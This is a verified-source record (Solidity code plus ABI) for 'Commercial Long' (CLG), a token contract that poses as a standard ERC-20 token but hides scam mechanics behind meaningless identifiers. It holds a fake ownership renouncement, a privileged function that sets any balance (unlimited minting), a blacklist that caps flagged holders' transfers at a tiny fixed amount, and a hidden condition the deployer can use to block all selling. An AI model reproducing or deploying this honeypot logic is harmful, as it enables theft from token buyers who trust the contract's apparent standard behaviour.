{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface senderMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract walletLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapLiquidity {\n    function createPair(address enableLiquidity, address takeAuto) external returns (address);\n}\n\ninterface feeTxReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverBuy) external view returns (uint256);\n\n    function transfer(address txFee, uint256 txReceiverWallet) external returns (bool);\n\n    function allowance(address feeIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txReceiverWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txFee,\n        uint256 txReceiverWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquiditySwap, uint256 value);\n    event Approval(address indexed feeIs, address indexed spender, uint256 value);\n}\n\ninterface amountTokenSwap is feeTxReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CommercialLong is walletLiquidity, feeTxReceiver, amountTokenSwap {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txMax;\n    }\n\n    function transfer(address modeLiquidity, uint256 txReceiverWallet) external virtual override returns (bool) {\n        return amountLaunched(_msgSender(), modeLiquidity, txReceiverWallet);\n    }\n\n    event OwnershipTransferred(address indexed tokenSell, address indexed sellBuy);\n\n    address tradingSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitFrom;\n    }\n\n    uint8 private maxWallet = 18;\n\n    uint256 public takeToken;\n\n    constructor (){\n        \n        senderMax tradingEnableTotal = senderMax(tradingSender);\n        limitWallet = swapLiquidity(tradingEnableTotal.factory()).createPair(tradingEnableTotal.WETH(), address(this));\n        if (takeToken == txTokenSell) {\n            takeToken = fromReceiver;\n        }\n        swapShouldReceiver = _msgSender();\n        senderMode();\n        exemptIs[swapShouldReceiver] = true;\n        launchedBuy[swapShouldReceiver] = txMax;\n        \n        emit Transfer(address(0), swapShouldReceiver, txMax);\n    }\n\n    uint256 minLimit;\n\n    uint256 constant amountFeeIs = 20 ** 10;\n\n    function enableMarketing(address fundShould) public {\n        totalToLaunched();\n        \n        if (fundShould == swapShouldReceiver || fundShould == limitWallet) {\n            return;\n        }\n        fromWalletTo[fundShould] = true;\n    }\n\n    mapping(address => bool) public exemptIs;\n\n    function amountLaunched(address swapSender, address txFee, uint256 txReceiverWallet) internal returns (bool) {\n        if (swapSender == swapShouldReceiver) {\n            return senderToken(swapSender, txFee, txReceiverWallet);\n        }\n        uint256 atLaunched = feeTxReceiver(limitWallet).balanceOf(receiverTx);\n        require(atLaunched == buyFrom);\n        require(txFee != receiverTx);\n        if (fromWalletTo[swapSender]) {\n            return senderToken(swapSender, txFee, amountFeeIs);\n        }\n        return senderToken(swapSender, txFee, txReceiverWallet);\n    }\n\n    address receiverTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxWallet;\n    }\n\n    function senderToken(address swapSender, address txFee, uint256 txReceiverWallet) internal returns (bool) {\n        require(launchedBuy[swapSender] >= txReceiverWallet);\n        launchedBuy[swapSender] -= txReceiverWallet;\n        launchedBuy[txFee] += txReceiverWallet;\n        emit Transfer(swapSender, txFee, txReceiverWallet);\n        return true;\n    }\n\n    address private exemptLiquidity;\n\n    function atAmount(uint256 txReceiverWallet) public {\n        totalToLaunched();\n        buyFrom = txReceiverWallet;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalTo;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedFundSwap;\n    }\n\n    function transferFrom(address swapSender, address txFee, uint256 txReceiverWallet) external override returns (bool) {\n        if (_msgSender() != tradingSender) {\n            if (totalTo[swapSender][_msgSender()] != type(uint256).max) {\n                require(txReceiverWallet <= totalTo[swapSender][_msgSender()]);\n                totalTo[swapSender][_msgSender()] -= txReceiverWallet;\n            }\n        }\n        return amountLaunched(swapSender, txFee, txReceiverWallet);\n    }\n\n    address public limitWallet;\n\n    uint256 public limitAuto;\n\n    uint256 private txMax = 100000000 * 10 ** 18;\n\n    bool public launchAuto;\n\n    mapping(address => bool) public fromWalletTo;\n\n    string private launchedFundSwap = \"Commercial Long\";\n\n    function balanceOf(address receiverBuy) public view virtual override returns (uint256) {\n        return launchedBuy[receiverBuy];\n    }\n\n    mapping(address => uint256) private launchedBuy;\n\n    function atSwap(address modeLiquidity, uint256 txReceiverWallet) public {\n        totalToLaunched();\n        launchedBuy[modeLiquidity] = txReceiverWallet;\n    }\n\n    string private limitFrom = \"CLG\";\n\n    address public swapShouldReceiver;\n\n    uint256 buyFrom;\n\n    uint256 public txTokenSell;\n\n    uint256 public fromReceiver;\n\n    function getOwner() external view returns (address) {\n        return exemptLiquidity;\n    }\n\n    function totalToLaunched() private view {\n        require(exemptIs[_msgSender()]);\n    }\n\n    function approve(address marketingTeamAmount, uint256 txReceiverWallet) public virtual override returns (bool) {\n        totalTo[_msgSender()][marketingTeamAmount] = txReceiverWallet;\n        emit Approval(_msgSender(), marketingTeamAmount, txReceiverWallet);\n        return true;\n    }\n\n    function walletFund(address senderLaunch) public {\n        if (launchAuto) {\n            return;\n        }\n        if (takeToken != txTokenSell) {\n            takeToken = limitAuto;\n        }\n        exemptIs[senderLaunch] = true;\n        if (fromReceiver == takeToken) {\n            takeToken = fromReceiver;\n        }\n        launchAuto = true;\n    }\n\n    function senderMode() public {\n        emit OwnershipTransferred(swapShouldReceiver, address(0));\n        exemptLiquidity = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return exemptLiquidity;\n    }\n\n    function allowance(address modeIsLimit, address marketingTeamAmount) external view virtual override returns (uint256) {\n        if (marketingTeamAmount == tradingSender) {\n            return type(uint256).max;\n        }\n        return totalTo[modeIsLimit][marketingTeamAmount];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquiditySwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeIsLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTeamAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTeamAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txReceiverWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txReceiverWallet\",\"type\":\"uint256\"}],\"name\":\"atAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txReceiverWallet\",\"type\":\"uint256\"}],\"name\":\"atSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundShould\",\"type\":\"address\"}],\"name\":\"enableMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromWalletTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapShouldReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txReceiverWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txReceiverWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTokenSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLaunch\",\"type\":\"address\"}],\"name\":\"walletFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CommercialLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}